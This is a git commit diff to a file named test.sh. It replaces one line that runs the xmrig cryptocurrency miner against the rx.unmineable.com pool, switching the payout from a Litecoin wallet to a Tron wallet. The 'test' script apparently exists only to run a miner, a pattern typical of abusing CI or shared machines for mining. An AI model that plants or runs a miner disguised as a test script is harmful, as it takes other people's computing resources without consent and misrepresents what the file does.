510e5488b20f1f15921624025803a9c172492702
Aligollez <59908197+aligollez@users.noreply.github.com>
2021-12-01 17:13:30 +0300

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,1 @@
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u LTC:LfV6ZrDkHf8SetmwEwugqvjARagLJweVsz.sa#bz7b-m822
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TRTJsUvPX1KxMjRqEm4XQD5QzfbDwg8fh7.s1a2#9hxo-ga6p
